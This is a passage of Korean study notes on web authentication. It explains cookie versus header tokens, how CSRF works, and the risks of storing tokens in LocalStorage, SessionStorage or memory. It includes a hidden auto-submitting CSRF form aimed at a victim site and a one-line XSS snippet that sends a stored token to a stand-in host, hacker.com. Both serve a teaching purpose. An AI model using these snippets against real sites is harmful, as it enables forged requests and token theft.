  });

  //axios 사용 시
  // 매 요청마다 설정
  axios.post('https://api.com/login', data, {
    withCredentials: true, // 쿠키 포함 (필수!)
  });

  // 전역 설정
  axios.defaults.withCredentials = true;
  ```
- 쿠키 기반 인증에서 CSRF 공격이 발생할 수 있는 원리는 무엇인가요? 🍠
  > 브라우저가 요청 출처와 상관없이 쿠키를 자동으로 첨부하기 때문
  **단계별 공격 원리**
  **① 피해자 로그인**
  ```jsx
  //피해자가 goguma.com에 로그인
  → 서버가 세션 쿠키 발급
  → 브라우저에 자동 저장

  브라우저 쿠키 저장소:
  session_id=abc123; Domain=goguma.com
  ```
  **② 악성 사이트 방문**
  ```jsx
  피해자가 로그아웃 안 한 채로
  evil.com 방문 (광고 클릭, 피싱 메일 등)
  ```
  **③ 악성 사이트가 몰래 요청 전송**
  ```jsx
  <!-- evil.com의 숨겨진 코드 -->
  <form action="https://goguma.com/order" method="POST">
    <input type="hidden" name="item" value="고구마" />
    <input type="hidden" name="count" value="9999" />
  </form>
  <script>document.forms[0].submit()</script>
  ```
  **④ 브라우저가 쿠키 자동 첨부**
  ```jsx
  요청 출처: evil.com
  요청 대상: goguma.com

  → 브라우저: "goguma.com 요청이네? 쿠키 자동 첨부!"
  → Cookie: session_id=abc123 ← 자동 포함 💥
  ```
  **⑤ 서버가 정상 요청으로 인식**
  ```jsx
  goguma.com 서버:
  "session_id=abc123 → 피해자 계정이네!"
  "정상 요청으로 처리" 💥
  ```
- 헤더 방식 인증의 주요 장점(예: CSRF 방어, 선택적 전송, CORS 단순화)을 정리해주세요. 🍠
  - `CSRF 방어 (가장 큰 장점)`
    -쿠키 → 브라우저가 자동 첨부 -헤더 → JS 코드가 직접 첨부
    ```jsx
    // 헤더 방식 - JS가 직접 토큰을 첨부
    fetch("https://api.com/order", {
      headers: {
        Authorization: "Bearer abc123"  // 악성 사이트는 이걸 할 수 없음!
      }
    })

    악성 사이트(evil.com)가 goguma.com으로 요청을 보내도
    → Authorization 헤더를 직접 조작하는 건 불가능
    → 토큰이 없으니 서버가 거부 ✅

    ∴ CSRF 공격 원천 차단!
    ```
  - `선택적 전송`
    -쿠키 → 조건만 맞으면 모든 요청에 자동 첨부 -헤더 → 필요한 요청에만 포함
    ```jsx
    // 인증 필요한 요청에만 헤더 포함
    fetch("/api/mypage", {
      headers: { Authorization: `Bearer ${token}` }  // ✅ 포함
    })

    // 인증 불필요한 요청은 헤더 없이
    fetch("/images/logo.png")  // ✅ 토큰 미포함 → 네트워크 낭비 없음
    fetch("/api/products")     // ✅ 토큰 미포함

    쿠키 방식                    헤더 방식
    이미지 요청 → 쿠키 자동 첨부  이미지 요청 → 헤더 없음 ✅
    CSS 요청   → 쿠키 자동 첨부   CSS 요청   → 헤더 없음 ✅
    API 요청   → 쿠키 자동 첨부   API 요청   → 헤더 포함 ✅
    ```
    > 불필요한 데이터 전송이 없어 네트워크 효율이 높아짐
  - `CORS 단순화`
    -쿠키 → 크로스 도메인 설정 까다로움 -헤더 → 설정 단순
    ```jsx
    // ❌ 쿠키 방식 - 복잡한 CORS 설정 필요
    app.use(cors({
      origin: "https://front.com",    // * 사용 불가
      credentials: true               // 반드시 추가
    }))
    // + SameSite=None; Secure 설정
    // + 클라이언트에서 credentials: "include" 설정

    // ✅ 헤더 방식 - 단순한 CORS 설정
    app.use(cors({
      origin: "*"   // 와일드카드 사용 가능!
    }))

    쿠키 방식 크로스 도메인 체크리스트
    □ Access-Control-Allow-Origin (명시적 도메인)
    □ Access-Control-Allow-Credentials: true
    □ SameSite=None; Secure
    □ credentials: "include" (클라이언트)

    헤더 방식 크로스 도메인 체크리스트
    □ Access-Control-Allow-Origin: * (와일드카드 가능)
    ```
  - `다양한 클라이언트 지원`
    -쿠키 → 브라우저 전용 -헤더 → 어떤 클라이언트든지 사용 가능
  - `Stateless 서버 구현 가능`
    -`JWT` 토큰은 서버가 상태 저장하지 않아도 검증 가능
    ```jsx
    쿠키 + 세션 방식
    → 서버가 세션 저장소 필요 (Redis, DB)
    → 서버 여러 대면 세션 공유 문제 발생

    헤더 + JWT 방식
    → 토큰 자체에 정보 포함
    → 서버가 어떤 대여도 독립적으로 검증 가능 ✅
    → 수평 확장(Scale-out) 용이
    ```
- 토큰을 클라이언트에 저장할 때 LocalStorage, SessionStorage, 메모리 저장의 장단점을 비교해주세요. 🍠
  - `LocalStorage`
    ```jsx
    // 저장
    localStorage.setItem('token', 'abc123');

    // 읽기
    localStorage.getItem('token');

    // 삭제
    localStorage.removeItem('token');
    ```

    - **✅ 장점**
      - 브라우저를 닫아도 **영구 보존**
      - 같은 도메인의 **모든 탭에서 공유**
      - 구현이 매우 단순
    - **❌ 단점**
      - JS로 자유롭게 접근 가능 → **XSS 공격에 그대로 노출**
      - HttpOnly 설정 불가 → 악성 스크립트가 토큰 탈취 가능
    ```jsx
    // XSS 공격 시 토큰 탈취 가능
    fetch('https://hacker.com?token=' + localStorage.getItem('token'));
    ```
  - `SessionStorage`
    ```jsx
    // 저장
    sessionStorage.setItem('token', 'abc123');

    // 읽기
    sessionStorage.getItem('token');

    // 삭제
    sessionStorage.removeItem('token');
    ```

    - **✅ 장점**
      - **탭을 닫으면 자동 삭제** → LocalStorage보다 노출 범위 축소
      - 탭 간 격리 → **다른 탭과 공유 안 됨**
    - **❌ 단점**
      - JS로 접근 가능 → **XSS 취약점은 동일**
      - 탭을 닫으면 삭제 → 새 탭에서 다시 로그인 필요
      - 탭 간 공유 안 됨 → 여러 탭 사용 시 불편
  - `메모리 저장(변수)`
    ```jsx
    // 모듈 내 변수로 저장
    let accessToken = null;

    export const setToken = (token) => {
      accessToken = token;
    };
    export const getToken = () => accessToken;
    export const clearToken = () => {
      accessToken = null;
    };
    ```

    - **✅ 장점**
      - JS 변수라도 **외부 스크립트에서 직접 접근 어려움**
      - 페이지 새로고침 / 탭 닫으면 **자동 소멸** → 토큰 노출 최소화
      - XSS 피해 범위가 상대적으로 작음
    - **❌ 단점**
      - **새로고침하면 토큰 사라짐** → 매번 재발급 필요
      - 탭 간 공유 불가
      - 재발급을 위해 **Refresh Token을 별도 저장**해야 함
    ```jsx
    페이지 새로고침
    → 메모리 초기화
    → Access Token 사라짐
    → Refresh Token으로 재발급 필요
    (Refresh Token은 HttpOnly 쿠키에 저장)
    ```
- Single Page Application, Mobile Application, Server Side Rendering Application 에서 여러분들이 생각하는 적합한 인증 전략은 무엇이라고 생각하시나요? 🍠
  SSRA: 서버 세션 기반 인증 + HttpOnly / Secure Cookie
